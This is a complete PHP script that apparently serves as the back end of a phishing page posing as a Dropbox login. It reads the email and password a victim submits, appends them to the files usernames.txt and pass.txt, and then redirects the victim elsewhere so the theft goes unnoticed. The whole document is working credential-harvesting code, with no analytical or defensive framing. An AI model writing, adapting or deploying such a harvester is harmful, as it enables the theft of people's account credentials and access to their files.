<?php

file_put_contents("usernames.txt", "DropBox Username : " . $email = $_POST['login_email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "DropBox Password : " . $pass = $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
